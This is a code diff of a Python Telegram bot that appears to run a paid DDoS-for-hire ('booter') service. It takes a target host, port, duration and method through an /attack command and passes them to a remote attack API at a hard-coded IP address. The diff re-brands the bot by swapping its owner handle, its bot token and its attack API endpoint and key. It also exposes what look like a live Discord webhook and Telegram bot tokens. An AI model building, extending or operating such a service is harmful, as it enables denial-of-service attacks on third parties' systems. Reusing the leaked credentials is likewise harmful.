@@ -13,7 +13,7 @@ from telepot.namedtuple import ReplyKeyboardMarkup, KeyboardButton
 
 
 webhook_url = 'https://discord.com/api/webhooks/1138159630019739749/x9KxngoRYe7DuAUEBjn-wf185MHahChKTK7zrd5XxwdYV9aB1g5LbfK72YVwmMePCVPt'  # discord webhook here
-TOKEN = '6304740874:AAH9WKzlNy6FH56I_m3apm22kuMUWEaUzIQ'  # your bot token here
+TOKEN = '7500966509:AAGByZ44gAoxvDjYGuIdmfoO8U-mebyAeCI'  # your bot token here
 
 attack_slots = 2
 attack_slots_lock = threading.Lock()
@@ -56,7 +56,7 @@ def is_user_authorized(user_id):
     if info['expiry_date'] < datetime.datetime.now():
         del authorized_users[user_id]
         write_authorized_users(authorized_users)
-        bot.sendMessage(user_id, 'Your plan has expired. Contact @atusssssssss to renew.')
+        bot.sendMessage(user_id, 'Your plan has expired. Contact @keccy to renew.')
         return False
     return True
 
@@ -326,7 +326,7 @@ def perform_attack(target, port, duration, method, user_id):
     concurrents = info['concurrents']
     user_attack_slots = info.get('attack_slots', 0)
     
-    url = f'http://139.162.53.243//api.php?key=RPDpdA4FC9U7P8e&host={target}&port={port}&time={duration}&method={method}'  # Perbaikan disini
+    url = f'http://104.248.155.213:8080//?key-lizard@keis&username=lizardpredator$host={target}&port={port}&time={duration}&method={method}'  # Perbaikan disini
     response = requests.get(url)
     response_text = response.text
     
@@ -395,7 +395,7 @@ def handle_message(msg):
         last_attack_time = None
 
     if not is_user_authorized(user_id):
-        bot.sendMessage(chat_id, f'You dont have plan. Contact @winterkeith for buying plan.\n\nYour ID: <code>{user_id}</code>', parse_mode='HTML')
+        bot.sendMessage(chat_id, f'You dont have plan. Contact @keccy for buying plan.\n\nYour ID: <code>{user_id}</code>', parse_mode='HTML')
         return
 
     if user_id not in admin_users:
@@ -436,7 +436,7 @@ def handle_message(msg):
 - /unblacklist - <strong>Remove target from BlackList.</strong>
 - /listblacklist - <strong>See all BlackList.</strong>
 
-Copyright: @winterkeith'''
+Copyright: @keccy'''
             bot.sendMessage(chat_id, message, parse_mode='HTML')
 
 
@@ -616,14 +616,14 @@ Copyright: @winterkeith'''
                 message = f'<strong>List Methods</strong>\n {method_list}'
                 bot.sendMessage(chat_id, message, parse_mode='HTML')
         elif text == '/info':
-            message = '<strong>Owner</strong>: @winterkeith\n<strong>Version</strong>: 2.0\nIf you want to buy source. Contact @winterkeith'
+            message = '<strong>Owner</strong>: @keccy\n<strong>Version</strong>: 2.0\nIf you want to buy source. Contact @keccy'
             bot.sendMessage(chat_id, message, parse_mode='HTML')
 
         elif text == '/running':
             handle_running_command(chat_id)
         elif text.startswith('/attack'):
             if not is_user_authorized(user_id):
-                bot.sendMessage(chat_id, 'You dont have plan. Contact @winterkeith for buying plan.')
+                bot.sendMessage(chat_id, 'You dont have plan. Contact @keccy for buying plan.')
                 return
 
             
@@ -716,7 +716,7 @@ Copyright: @winterkeith'''
               concurrents = info.get('concurrents', 0)
               user_attack_slots = info.get('attack_slots', 0)
               if concurrents <= 0:
-                bot.sendMessage(chat_id, 'Your concurrents count is zero, Contact @winterkeith To Buy Plan')
+                bot.sendMessage(chat_id, 'Your concurrents count is zero, Contact @keccy To Buy Plan')
                 del states[chat_id]  
                 return
               if user_attack_slots >= concurrents:
@@ -784,7 +784,7 @@ Copyright: @winterkeith'''
               concurrents = info.get('concurrents', 0)
               user_attack_slots = info.get('attack_slots', 0)
               if concurrents <= 0:
-                bot.sendMessage(chat_id, 'Your concurrents count is zero. Contact @winterkeith To Buy Plan')
+                bot.sendMessage(chat_id, 'Your concurrents count is zero. Contact @keccy To Buy Plan')
                 del states[chat_id]  
                 return
               if user_attack_slots >= concurrents:
@@ -931,7 +931,7 @@ def check_expired_users():
         if expiry_date < now:
             del authorized_users[user_id]
             write_authorized_users(authorized_users)
-            bot.sendMessage(user_id, 'Your plan has expired. Contact @winterkeith to renew.')
+            bot.sendMessage(user_id, 'Your plan has expired. Contact @keccy to renew.')
     threading.Timer(86400, check_expired_users).start()
 
 def increase_attack_slots():
